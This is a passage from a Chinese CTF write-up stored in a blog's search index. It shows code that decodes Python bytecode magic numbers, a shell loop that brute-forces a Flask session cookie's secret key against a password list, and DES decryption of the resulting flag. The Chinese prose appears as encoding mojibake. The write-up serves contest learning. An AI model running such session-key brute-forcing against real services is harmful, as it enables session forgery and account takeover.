class="number">3</span>, <span class="number">6</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3379</span>: (<span class="number">3</span>, <span class="number">6</span>),  <span class="comment"># rc1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.7</span></span><br><span class="line">    <span class="number">3390</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3391</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># a2</span></span><br><span class="line">    <span class="number">3392</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># a4</span></span><br><span class="line">    <span class="number">3393</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># b1</span></span><br><span class="line">    <span class="number">3394</span>: (<span class="number">3</span>, <span class="number">7</span>),  <span class="comment"># b5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.8</span></span><br><span class="line">    <span class="number">3400</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3401</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3410</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># a1</span></span><br><span class="line">    <span class="number">3411</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3412</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># b2</span></span><br><span class="line">    <span class="number">3413</span>: (<span class="number">3</span>, <span class="number">8</span>),  <span class="comment"># b4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Python 3.9</span></span><br><span class="line">    <span class="number">3420</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3421</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3422</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a0</span></span><br><span class="line">    <span class="number">3423</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a2</span></span><br><span class="line">    <span class="number">3424</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a2</span></span><br><span class="line">    <span class="number">3425</span>: (<span class="number">3</span>, <span class="number">9</span>),  <span class="comment"># a2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;magic.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">807</span>):</span><br><span class="line">        magic_number = f.readline().strip()</span><br><span class="line">        number = reverse_magic(magic_number)</span><br><span class="line">        res = res + <span class="built_in">str</span>(PYTHON_MAGIC[number][<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res)))</span><br></pre></td></tr></table></figure><p>æ‰“å¼€å¾—åˆ°çš„ä¿¡æ¯æ˜¯flask-sessionï¼Œéœ€è¦å»è§£å¯†ï¼Œå¹¶ä¸”æç¤ºäº†å¯†é’¥ä¸ºå¼±å£ä»¤ã€‚githubä¸Šå¯ä»¥æ‰¾åˆ°å·¥å…·flask-session-cookie-managerï¼Œå› ä¸ºè¦çˆ†ç ´ï¼Œæ‰€ä»¥æä¸ªshellè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ï¼/bin/bash</span></span><br><span class="line"> <span class="keyword">while</span> read line</span><br><span class="line"> do</span><br><span class="line">  echo $line</span><br><span class="line">  python3  flask_session_cookie_manager3.py decode -s $line -c <span class="string">&#x27;eyJhbGdvcml0aG0iOiJkZXMiLCJmbGFnIjoiVW5BbVBWWTRhdCt2bkJqellPNytUZEZSMmZEYnhScytqQzdsMWt2b2hUMFp4clBDOEJUTWJBPT0ifQ.ZkyTwA.KPlAnhfBH8qMClLyoP6yboafHyw&#x27;</span></span><br><span class="line"> done &lt;  top1000.txt</span><br></pre></td></tr></table></figure><p>çˆ†ç ´å¾—åˆ°ï¼š</p><p>12312312</p><p>{â€˜algorithmâ€™: â€˜desâ€™, â€˜flagâ€™: â€˜UnAmPVY4at+vnBjzYO7+TdFR2fDbxRs+jC7l1kvohT0ZxrPC8BTMbA&#x3D;&#x3D;â€™}</p><p>æ˜¾ç„¶åœ¨çº¿ç½‘ç«™è§£deså³å¯ï¼Œå¯†é’¥å°±æ˜¯12312312</p><p>åœ¨çº¿ç½‘ç«™ï¼š<a href="https://the-x.cn/cryptography/Des.aspx">DESåœ¨çº¿è§£å¯† DESåœ¨çº¿åŠ å¯† des hex - The X åœ¨çº¿å·¥å…· (the-x.cn)</a></p><p>WKCTF{N0w_u_Know_th3_fl4sk_Sess1on}</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
